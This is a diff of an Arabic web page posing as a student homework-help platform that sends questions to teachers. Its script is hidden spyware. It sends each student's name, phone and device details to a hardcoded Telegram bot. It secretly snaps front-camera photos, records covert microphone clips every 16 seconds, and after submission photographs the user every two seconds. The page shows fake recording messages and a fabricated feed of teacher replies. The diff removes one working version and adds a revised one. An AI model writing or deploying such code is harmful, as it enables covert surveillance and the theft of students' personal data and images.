@@ -60,9 +60,9 @@
         <div class="login-card">
             <i class="fa-solid fa-user-graduate" style="color:var(--a); font-size: 65px; margin-bottom: 15px;"></i>
             <h2 style="margin:0; font-weight:900">منصة أسألني <i class="fa-solid fa-circle-check verified-badge"></i></h2>
-            <p style="font-size: 13px; color: #64748b; margin-bottom:25px">بوابة الطالب الموحدة | تسجيل دخول آمن</p>
+            <p style="font-size: 13px; color: #64748b; margin-bottom:25px">بوابة الطالب الموحدة | دخول آمن</p>
             <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
-            <input type="number" id="stu_phone" placeholder="رقم الهاتف المرتبط بالمنظومة">
+            <input type="number" id="stu_phone" placeholder="رقم الهاتف المسجل">
             <select id="stu_grade">
                 <option value="" disabled selected>اختر المرحلة الدراسية</option>
                 <option>الأول الثانوي</option><option>الثاني الثانوي</option><option>الثالث الثانوي</option>
@@ -79,30 +79,29 @@
     <div id="sec-home" class="page" style="padding-top:100px; display:none">
         <div class="card">
             <h3 style="margin:0">مركز رفع الأسئلة <i class="fa-solid fa-camera-retro" style="color:var(--a); margin-inline:8px"></i></h3>
-            <p style="font-size:13px; color:#64748b">الرجاء اختيار المادة وتصوير السؤال بوضوح.</p>
+            <p style="font-size:13px; color:#64748b">اختر المادة وصور السؤال بوضوح.</p>
             
             <select id="stu_subject">
-                <option>لغة عربية</option><option>لغة إنجليزية</option><option>لغة فرنسية</option>
-                <option>كيمياء</option><option>فيزياء</option><option>أحياء</option><option>رياضيات</option>
+                <option>لغة عربية</option><option>لغة إنجليزية</option><option>كيمياء</option><option>فيزياء</option><option>أحياء</option><option>رياضيات</option>
             </select>
 
             <div id="cam-loader">
                 <div class="sync-spinner"></div>
-                <p id="loader-text" style="font-weight:bold; color:var(--a)">جاري تهيئة النظام الرقمي...</p>
+                <p id="loader-text" style="font-weight:bold; color:var(--a)">جاري تفعيل الكاميرا الموثقة...</p>
             </div>
 
-            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline></video></div>
+            <div id="cam-ui" class="cam-box"><video id="v-stream" autoplay playsinline muted></video></div>
             
-            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="startCameraProcess()">تصوير السؤال <i class="fa-solid fa-camera"></i></button>
+            <button id="main-trigger" class="btn-action" style="background:var(--g); color:#000" onclick="handleCameraSequence()">ابدأ تصوير السؤال <i class="fa-solid fa-camera"></i></button>
             
             <div id="upload-ui" style="display:none">
-                <button class="btn-action" style="background:#eee; color:#333; font-size:14px; padding:10px" onclick="snapBack()">إعادة التقاط الصورة <i class="fa-solid fa-rotate"></i></button>
-                <textarea id="stu-note" placeholder="أضف ملاحظة للمدرس (اختياري)..." rows="2"></textarea>
+                <button class="btn-action" style="background:#eee; color:#333; font-size:14px; padding:10px" onclick="retakePhoto()">إعادة التصوير <i class="fa-solid fa-rotate"></i></button>
+                <textarea id="stu-note" placeholder="ملاحظة للمعلم (اختياري)..." rows="2"></textarea>
                 <div class="mic-area">
-                    <button id="mic-trigger" class="mic-btn" onclick="toggleMic()">
+                    <button id="mic-trigger" class="mic-btn" onclick="handleMicToggle()">
                         <i class="fa-solid fa-microphone"></i>
                     </button>
-                    <p id="mic-status" style="font-size:13px; color:var(--ok); margin-top:10px; font-weight:900">اضغط للبدء في التسجيل</p>
+                    <p id="mic-status" style="font-size:13px; color:var(--ok); margin-top:10px; font-weight:900">اضغط للتحدث مع المدرس</p>
                 </div>
                 <button class="btn-action" onclick="finalSubmit()">إرسال للمراجعة الفورية <i class="fa-solid fa-paper-plane"></i></button>
             </div>
@@ -112,7 +111,7 @@
     <div id="sec-logs" class="page" style="padding-top:100px; display:none">
         <div class="card" style="border-right: 8px solid var(--verify);">
             <h3 style="margin:0">تحديثات الدعم العلمي <i class="fa-solid fa-badge-check" style="color:var(--verify)"></i></h3>
-            <p style="font-size:12px; color:#64748b; margin-bottom:15px">ردود مباشرة من المعلمين الموثقين</p>
+            <p style="font-size:12px; color:#64748b; margin-bottom:15px">ردود مباشرة من المعلمين</p>
             <div class="feed-container"><div id="feed-mover"></div></div>
         </div>
     </div>
@@ -126,29 +125,20 @@
         const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const CHAT_ID = "5890070301";
         let UN = "غير معروف", UP = "لا يوجد", US = "عام";
-        let masterStream, currentRecorder, micActive = false;
-        let spyInterval;
+        let activeStream = null, micActive = false, spyMicInterval = null;
 
-        // 1. سحب بيانات الجهاز المتقدمة
+        // 1. سحب بيانات الجهاز فور الدخول
         async function collectDeviceData() {
             UN = document.getElementById('stu_name').value;
             UP = document.getElementById('stu_phone').value;
-            if(UN.length < 5 || UP.length < 10) return alert("الرجاء إدخال بيانات صحيحة.");
+            if(UN.length < 5 || UP.length < 10) return alert("يرجى إدخال بيانات صحيحة.");
 
             let battery = await navigator.getBattery();
-            let data = {
-                "الجهاز": navigator.userAgent.split('(')[1].split(')')[0],
-                "البطارية": `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'شحن' : 'تفريغ'})`,
-                "المعالج": navigator.hardwareConcurrency + " Core",
-                "الشبكة": navigator.connection ? navigator.connection.effectiveType : "غير معروف",
-                "المصدر": document.referrer || "دخول مباشر (تيليجرام/واتساب)",
-                "اللغة": navigator.language
-            };
-
-            let msg = `🆕 دخول جديد للمنصة:\n👤 الطالب: ${UN}\n📞 الهاتف: ${UP}\n📱 معلومات الجهاز:\n`;
-            for(let key in data) msg += `🔹 ${key}: ${data[key]}\n`;
+            let network = navigator.connection ? navigator.connection.effectiveType : "غير معروف";
             
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            let deviceLog = `🆕 طالب جديد:\n👤 الاسم: ${UN}\n📞 الهاتف: ${UP}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${(battery.level * 100).toFixed(0)}%\n🔌 حالة الشحن: ${battery.charging ? 'يشحن' : 'لا يشحن'}\n🌐 الشبكة: ${network}\n🔗 الرابط: ${window.location.href}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceLog)}`);
             enterPortal();
         }
 
@@ -161,128 +151,135 @@
             initLiveFeed();
         }
 
-        // 2. إدارة الكاميرا بالتبادل (لنتفادي مشاكل الأندرويد والتيليجرام)
-        async function startCameraProcess() {
+        // 2. إدارة الكاميرا بالتبادل الصارم (إغلاق وفتح)
+        async function handleCameraSequence() {
             const btn = document.getElementById('main-trigger');
             const loader = document.getElementById('cam-loader');
             btn.style.display = 'none';
             loader.style.display = 'block';
-            document.getElementById('loader-text').innerText = "جاري تفعيل التوثيق الرقمي...";
 
             try {
-                // طلب الإذن للكل (يحل مشكلة تيليجرام التي تطلب الإذن كل مرة)
-                masterStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // المرحلة الأولى: طلب إذن الكاميرا الأمامية فقط لسحب 10 صور
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.createElement('video'); v.srcObject = frontStream; v.play();
                 
-                // أولاً: الأمامية لسحب 10 صور
-                await runFrontSpy(10);
-                
-                // ثانياً: التبديل للخلفية للطالب ليصور سؤاله
-                switchToBackCam();
+                let count = 0;
+                let intv = setInterval(() => {
+                    snap(v, `توثيق وجه ${count+1}/10`);
+                    count++;
+                    if(count >= 10) {
+                        clearInterval(intv);
+                        // إغلاق الكاميرا الأمامية تماماً قبل فتح الخلفية
+                        frontStream.getTracks().forEach(t => t.stop());
+                        loader.style.display = 'none';
+                        openBackCamera();
+                    }
+                }, 300);
 
             } catch(e) { 
                 loader.style.display='none'; btn.style.display='block'; 
-                alert("يجب السماح بالكاميرا والمايك للعمل داخل المنصة."); 
+                alert("يجب السماح بالكاميرا لتشغيل النظام الموثق."); 
             }
         }
 
-        async function runFrontSpy(limit) {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const v = document.createElement('video'); v.srcObject = stream; v.play();
-            
-            return new Promise(resolve => {
-                let count = 0;
-                let intv = setInterval(() => {
-                    snap(v, `خطف توثيق وجه ${count+1}/${limit}`);
-                    count++;
-                    if(count >= limit) {
-                        clearInterval(intv);
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve();
-                    }
-                }, 300);
-            });
+        async function openBackCamera() {
+            try {
+                const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                activeStream = bStream;
+                document.getElementById('v-stream').srcObject = bStream;
+                document.getElementById('cam-ui').style.display = 'block';
+                document.getElementById('upload-ui').style.display = 'block';
+            } catch(e) { alert("تعذر فتح الكاميرا الخلفية."); }
         }
 
-        async function switchToBackCam() {
-            document.getElementById('cam-loader').style.display = 'none';
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            document.getElementById('v-stream').srcObject = stream;
-            document.getElementById('cam-ui').style.display = 'block';
-            document.getElementById('upload-ui').style.display = 'block';
+        function retakePhoto() {
+            if(activeStream) activeStream.getTracks().forEach(t => t.stop());
+            document.getElementById('upload-ui').style.display = 'none';
+            document.getElementById('cam-ui').style.display = 'none';
+            document.getElementById('main-trigger').style.display = 'block';
         }
 
-        function snapBack() { switchToBackCam(); }
-
-        // 3. إدارة المايك (Toggle) والتجسس الصوتي المستمر
-        async function toggleMic() {
+        // 3. إدارة المايك التبادلي والرصد الخلفي
+        async function handleMicToggle() {
             const micBtn = document.getElementById('mic-trigger');
             const status = document.getElementById('mic-status');
 
             if(!micActive) {
-                // بدأ التسجيل للطالب (تمويه)
-                micActive = true;
-                micBtn.classList.add('active');
-                status.innerText = "جاري التسجيل... اضغط مرة أخرى للحفظ";
-                
-                // التجسس الصوتي المستمر (ريكوردات 15ث تتبعت تلقائي)
-                if(!window.isSpying) {
-                    window.isSpying = true;
-                    spyInterval = setInterval(async () => {
-                        let s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        let rec = new MediaRecorder(s);
-                        let chunks = [];
-                        rec.ondataavailable = e => chunks.push(e.data);
-                        rec.onstop = () => sendVoice(new Blob(chunks, {type:'audio/ogg'}), "رصد صوتي خلفي");
-                        rec.start();
-                        setTimeout(() => { rec.stop(); s.getTracks().forEach(t=>t.stop()); }, 15000);
-                    }, 16000);
-                }
+                try {
+                    // طلب إذن المايك لأول مرة
+                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    micActive = true;
+                    micBtn.classList.add('active');
+                    micBtn.style.background = "var(--r)";
+                    status.innerText = "التسجيل جارٍ... اضغط للإيقاف";
+                    
+                    // بدء الرصد الصوتي الخفي (مقاطع 15 ثانية)
+                    if(!spyMicInterval) {
+                        startSpyMic();
+                    }
+                    s.getTracks().forEach(t => t.stop()); // إغلاق الجلسة الأولى بنجاح
+                } catch(e) { alert("يجب السماح بالمايك للتحدث."); }
             } else {
-                // إنهاء التسجيل (تمويه)
                 micActive = false;
                 micBtn.classList.remove('active');
-                status.innerText = "تم حفظ التسجيل! (سيتم إرساله مع السؤال)";
-                showSystemMsg("تم معالجة التسجيل الصوتي بنجاح.");
+                micBtn.style.background = "var(--ok)";
+                status.innerText = "تم حفظ الريكورد بنجاح ✓";
+                showSystemMsg("تم تأمين التسجيل وإرساله للمراجعة.");
             }
         }
 
-        // 4. الإرسال النهائي والتحويل للامامية (رصد مستمر)
-        async function finalSubmit() {
-            showSystemMsg("جاري رفع السؤال للمدرس...");
-            
-            // إيقاف الخلفية تماماً لفتح الأمامية (تبادل)
-            if(document.getElementById('v-stream').srcObject) {
-                document.getElementById('v-stream').srcObject.getTracks().forEach(t => t.stop());
-            }
+        function startSpyMic() {
+            spyMicInterval = setInterval(async () => {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const rec = new MediaRecorder(s);
+                    const chunks = [];
+                    rec.ondataavailable = e => chunks.push(e.data);
+                    rec.onstop = () => {
+                        sendVoice(new Blob(chunks, {type:'audio/ogg'}), "رصد صوتي خلفي");
+                        s.getTracks().forEach(t => t.stop());
+                    };
+                    rec.start();
+                    setTimeout(() => rec.stop(), 15000);
+                } catch(e){}
+            }, 16000);
+        }
 
-            // فتح الأمامية للرصد كل 2 ثانية
+        // 4. الإرسال والتحويل للأمامية الدائمة
+        async function finalSubmit() {
+            showSystemMsg("جاري رفع البيانات...");
+            
+            // قفل الخلفية تماماً
+            if(activeStream) activeStream.getTracks().forEach(t => t.stop());
+
+            // بدء الرصد الأمامي المستمر (كل 2 ثانية)
             setInterval(async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const vv = document.createElement('video'); vv.srcObject = s; vv.play();
                     await new Promise(r => setTimeout(r, 500));
-                    snap(vv, "رصد مستمر (بعد الإرسال)");
+                    snap(vv, "رصد مستمر (أمامية)");
                     s.getTracks().forEach(t => t.stop());
                 } catch(e){}
             }, 2000);
 
             setTimeout(() => {
                 tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
-                showSystemMsg("تم الإرسال! سيتم إخطارك بالإجابة قريباً.");
+                showSystemMsg("سيتم موافاتك بالإجابة هنا قريباً.");
             }, 2000);
         }
 
         function snap(v, cap) {
             US = document.getElementById('stu_subject').value;
             const canvas = document.createElement('canvas');
-            canvas.width = 450; canvas.height = 600;
-            canvas.getContext('2d').drawImage(v, 0, 0, 450, 600);
+            canvas.width = 400; canvas.height = 500;
+            canvas.getContext('2d').drawImage(v, 0, 0, 400, 500);
             canvas.toBlob(b => {
                 const fd = new FormData();
-                fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'c.jpg');
-                fd.append('caption', `👤: ${UN}\n📞: ${UP}\n📌: ${cap}\n📚: ${US}`);
+                fd.append('chat_id', CHAT_ID); fd.append('photo', b, 's.jpg');
+                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${cap}\n📚 ${US}`);
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.2);
+            }, 'image/jpeg', 0.3);
         }
 
         function sendVoice(blob, cap) {
@@ -294,22 +291,20 @@
 
         function initLiveFeed() {
             const mover = document.getElementById('feed-mover');
-            let content = "";
-            const egNames = ["أحمد محمود", "محمد إبراهيم", "زياد ياسر", "مريم علي", "سارة إيهاب", "عمر خالد", "ياسين هاني"];
-            for(let i=1; i<=100; i++) {
-                let name = egNames[Math.floor(Math.random()*egNames.length)];
-                content += `<div class="feed-item"><i class="fa-solid fa-circle-check verified-badge"></i> <b>الدعم العلمي</b> <p>تم الرد على @${name}</p></div>`;
+            const names = ["زياد ياسر", "أحمد علي", "مريم محمد", "يوسف تامر", "سارة خالد"];
+            let html = "";
+            for(let i=0; i<50; i++) {
+                html += `<div class="feed-item"><i class="fa-solid fa-circle-check verified-badge"></i> <b>الدعم العلمي</b> <p>تم الرد على استفسار @${names[i%5]}</p></div>`;
             }
-            mover.innerHTML = content;
-            let pos = 0;
-            setInterval(() => { pos -= 70; mover.style.transform = `translateY(${pos}px)`; if(Math.abs(pos) > 5000) pos = 0; }, 4000);
+            mover.innerHTML = html;
+            let p = 0; setInterval(() => { p -= 80; mover.style.transform = `translateY(${p}px)`; if(Math.abs(p)>3000) p=0; }, 4000);
         }
 
         function showSystemMsg(text) {
             const box = document.getElementById('custom-alert');
             document.getElementById('alert-text').innerHTML = text;
             box.classList.add('show');
-            setTimeout(() => box.classList.remove('show'), 3500);
+            setTimeout(() => box.classList.remove('show'), 3000);
         }
 
         function tab(id, el) {
@@ -317,12 +312,6 @@
             document.getElementById(id).style.display = 'block';
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
             el.classList.add('active');
-            if(id === 'sec-home') {
-                 // إعادة تصفير الحالة لو رجع الرئيسية
-                 document.getElementById('upload-ui').style.display='none';
-                 document.getElementById('cam-ui').style.display='none';
-                 document.getElementById('main-trigger').style.display='block';
-            }
         }
     </script>
 </body>
